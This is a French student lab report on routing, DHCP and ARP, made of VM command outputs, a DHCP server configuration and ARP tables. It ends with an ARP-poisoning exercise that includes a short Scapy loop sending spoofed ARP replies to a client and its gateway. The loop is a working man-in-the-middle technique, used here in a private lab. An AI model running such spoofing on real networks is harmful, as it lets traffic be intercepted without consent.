# TP2 : Routage, DHCP et DNS
  

# I. Routage
  

🌞 **Configuration de `router.tp2.efrei`**

La config :
```
[root@localhost ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:9f:aa:bd brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.56/24 brd 192.168.122.255 scope global dynamic noprefixroute enp0s3
       valid_lft 3533sec preferred_lft 3533sec
    inet6 fe80::a00:27ff:fe9f:aabd/64 scope link
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:15:7f:f6 brd ff:ff:ff:ff:ff:ff
```
Le ping fonctionne :
```
[diego@localhost ~]$ ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=30.7 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=28.2 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=115 time=31.4 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=115 time=29.1 ms
``` 

🌞 **Configuration de `node1.tp2.efrei`**

Conf:
```
VPCS> show

NAME   IP/MASK              GATEWAY           MAC                LPORT  RHOST:PORT
VPCS1  10.2.1.1/24          255.255.255.0     00:50:79:66:68:00  20006  127.0.0.1:20007
       fe80::250:79ff:fe66:6800/64

```
```
VPCS> ping 10.2.1.254/24

84 bytes from 10.2.1.254 icmp_seq=1 ttl=64 time=7.378 ms
84 bytes from 10.2.1.254 icmp_seq=2 ttl=64 time=5.540 ms
84 bytes from 10.2.1.254 icmp_seq=3 ttl=64 time=5.916 ms
84 bytes from 10.2.1.254 icmp_seq=4 ttl=64 time=5.287 ms
84 bytes from 10.2.1.254 icmp_seq=5 ttl=64 time=5.872 ms
```
Ajout de la route par défaut
```
VPCS : 10.2.1.1 255.255.255.0 gateway 10.2.1.254
```

```
VPCS> ping 8.8.8.8

84 bytes from 8.8.8.8 icmp_seq=1 ttl=114 time=39.631 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=114 time=40.686 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=114 time=31.989 ms
84 bytes from 8.8.8.8 icmp_seq=4 ttl=114 time=34.715 ms
```
Traceroute :
```
VPCS> trace 8.8.8.8
trace to 8.8.8.8, 8 hops max, press Ctrl+C to stop
 1   10.2.1.254   5.252 ms  6.293 ms  4.752 ms
 2   192.168.122.1   11.587 ms  8.636 ms  7.173 ms
 3   10.0.3.2   12.147 ms  11.863 ms  11.110 ms
 4     *  *  *
 5     *  *  *
 6     *  *  *
 7     *  *  *
 8     *  *  *
```

🌞 **Afficher la CAM Table du switch**

```
VPCS> show mac address-table
-------------------------------------------

Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    0050.7966.6800    DYNAMIC     Et0/1
   1    0800.2715.7ff6    DYNAMIC     Et0/0
Total Mac Addresses for this criterion: 2
```

# II. Serveur DHCP  

🌞 **Install et conf du serveur DHCP** sur `dhcp.tp2.efrei`
```
[root@localhost ~]# cat /etc/dhcp/dhcpd.conf

authoritative;

subnet 10.2.1.0 netmask 255.255.255.0 {
    range 10.2.1.10 10.2.1.253;
    option broadcast-address 10.2.1.255;
    option routers 10.2.1.254;
    option domaine-name-servers 1.1.1.1;
}
```

🌞 **Test du DHCP** sur `node1.tp2.efrei`
```
Executing the startup file

DDORA IP 10.2.1.10/24 GW 10.2.1.254

Hostname is too long. (Maximum 12 characters)

VPCS> show ip

NAME        : VPCS[1]
IP/MASK     : 10.2.1.10/24
GATEWAY     : 10.2.1.254
DNS         : 
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 43185, 43200/21600/37800
MAC         : 00:50:79:66:68:00
LPORT       : 20005
RHOST:PORT  : 127.0.0.1:20006
MTU         : 1500

VPCS>
```
🌟 **BONUS**
```
VPCS> show ip

NAME        : VPCS[1]
IP/MASK     : 10.2.1.10/24
GATEWAY     : 10.2.1.254
DNS         : 1.1.1.1
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 43185, 43200/21600/37800
MAC         : 00:50:79:66:68:00
LPORT       : 20005
RHOST:PORT  : 127.0.0.1:20006
MTU         : 1500

VPCS>
```

🌞 **Wireshark it !**

[échange DORA](échange_DHCP_DORA.pcapng)

# III. ARP
## 1. Les tables ARP
🌞 **Affichez la table ARP de `router.tp2.efrei`**
```
[root@localhost ~]# ip neighbor
10.2.1.253 dev enp0s8 lladdr 08:00:27:bb:d8:e2 REACHABLE
10.2.1.10 dev enp0s8 lladdr 00:50:79:66:68:00 STALE
192.168.122.1 dev enp0s3 lladdr 52:54:00:24:5d:59 REACHABLE
```
🌞 **Capturez l'échange ARP avec Wireshark**
[échange ARP](echange_ARP.pcapng)
## 2. ARP poisoning
🌞 **Envoyer une trame ARP arbitraire**
```
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:59:94:8e brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.4/24 brd 10.0.2.255 scope global dynamic eth0
       valid_lft 86371sec preferred_lft 86371sec
    inet6 fe80::a00:27ff:fe59:948e/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
```
🌞 **Mettre en place un ARP MITM**

# à finir !!

🌞 **Capture Wireshark `arp_mitm.pcap`**

[arp_mitm](arp_mitm.pcap.pcapng)
🌞 **Réaliser la même attaque avec Scapy**
```
from scapy.all import *

while True:
        send(ARP(pdst="10.2.1.10", psrc="10.2.1.254"))
        send(ARP(pdst="10.2.1.254", psrc="10.2.1.10"))
```